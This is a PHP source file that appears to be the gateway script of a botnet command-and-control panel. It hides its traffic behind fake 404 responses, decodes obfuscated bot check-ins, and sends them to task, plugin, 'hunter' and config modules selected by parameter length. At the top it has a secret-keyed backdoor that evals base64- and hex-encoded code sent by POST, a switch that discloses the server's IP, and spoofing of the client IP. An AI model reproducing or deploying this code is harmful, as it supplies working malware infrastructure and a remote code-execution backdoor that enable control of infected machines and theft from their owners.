<?php

$dir = str_replace('/scripts/set', '', str_replace('\\', '/', realpath('.'))) . '/';

//Cstart
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0IP') print($_SERVER['SERVER_ADDR']);
//Rkey start
if(@$_POST['id'] == 'BOTNETCHECKUPDATER0-WD8Sju5VR1HU8jlV'){
//Rkey end
	//file_put_contents('test.php', pack("H*", base64_decode($_POST['data'])));
	if(!empty($_POST['data'])) eval(pack("H*", base64_decode($_POST['data'])));
	exit;
}elseif(strpos(@$_GET['id'], 'BOTNETCHECKUPDATER') !== false || strpos(@$_POST['id'], 'BOTNETCHECKUPDATER') !== false) exit;
//Cend

$dbug = false;
$dbug = true;

if($dbug == true){	$input = array();
	$input[] = 'FullInput: ' . file_get_contents('php://input');
	$input[] = 'FullGet: ' . print_r($_GET, true);
}

error_reporting(0);
ini_set('error_reporting', 0);
header("Pragma: no-cache");
header("Expires: 0");

function no_found(){
	global $dir;
	header("HTTP/1.1 404 Not Found");
	header("Status: 404 Not Found");
	print(file_get_contents($dir . '404.html'));
	exit;
}

function check_rc(){
	global $config, $dir;
	if($config['scramb'] == 1 && count($_POST) != 1){
		header("HTTP/1.1 404 Not Found");
		header("Status: 404 Not Found");
		print(file_get_contents($dir . '404.html'));
		exit;
	}
}

function post_rc_decode(){
	global $post, $_POST, $gateway;
	if(count($_POST) == 1){
    	$post = rc_decode(array_shift($_POST));
    	@parse_str($post, $_POST);
    	$gateway = true;
	}
}

if(!empty($_POST['remote_ip'])){
	$_SERVER['REMOTE_ADDR'] = $_POST['remote_ip'];
	unset($_POST['remote_ip']);
}elseif(!empty($_SERVER["HTTP_X_REAL_IP"])){
	$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_X_REAL_IP"];
}

$config = file_exists($dir . 'cache/config.json') ? json_decode(file_get_contents($dir . 'cache/config.json'), 1) : '';
check_rc();
include_once($dir . 'includes/functions.rc.php');
post_rc_decode();

if($dbug == true){
	if(file_exists($dir . 'cache/debug/' . $_SERVER['REMOTE_ADDR'] . '.txt')){
		//if(filesize($dir . 'cache/debug/' . $_SERVER['REMOTE_ADDR'] . '.txt') == 0) file_put_contents($dir . 'cache/debug/' . $_SERVER['REMOTE_ADDR'] . '.txt', print_r($rc, true));
		
		$input[] = 'Decode: ' . $post;
		$input[] = 'ParseSTR: ' . print_r($_POST, true);
		
		$l = strlen($_GET['p']);
		
		switch(true){
			case (($l >= 1 && $l <= 6) || ($l >= 18 && $l <= 24)):
				$t = 'task.php';
			break;

			case (($l > 6 && $l <= 12) || ($l > 24 && $l <= 30)):
				$t = 'first.php';
			break;
	
			case (($l > 12 && $l < 18) || ($l > 30 && $l <= 36)):
				$t = 'plugs.php';
			break;
	
			case (($l > 36 && $l <= 48)):
				$t = 'comment.php';
			break;
	
			case (($l > 48 && $l <= 56)):
				$t = 'hunter.php';
			break;
	
			case (($l > 56 && $l <= 64)):
				$t = 'cfgs.php';
			break;
		}

		$input[] = 'HideGate: ' . $l . ' - ' . $t;
		file_put_contents($dir . 'cache/debug/' . $_SERVER['REMOTE_ADDR'] . '.txt', implode("\r\n-----------------------\r\n", $input) . "\r\n\r\n++++++++++++++++++++++++++++++++++++++++++++++\r\n\r\n", FILE_APPEND);
	}
}

if(!empty($_GET['p'])){
	$l = strlen($_GET['p']);
	unset($_GET['p']);
	switch(true){
		case (($l >= 1 && $l <= 6) || ($l >= 18 && $l <= 24)):
			include_once('task.php');
		break;
	
		case (($l > 6 && $l <= 12) || ($l > 24 && $l <= 30)):
			include_once('first.php');
		break;
	
		case (($l > 12 && $l < 18) || ($l > 30 && $l <= 36)):
			include_once('plugs.php');
		break;
	
		case (($l > 36 && $l <= 48)):
			include_once('comment.php');
		break;
	
		case (($l > 48 && $l <= 56)):
			include_once('hunter.php');
		break;
	
		case (($l > 56 && $l <= 64)):
			include_once('cfgs.php');
		break;
	
		default:
			no_found();
		break;
	}
}else{
	no_found();
}

?>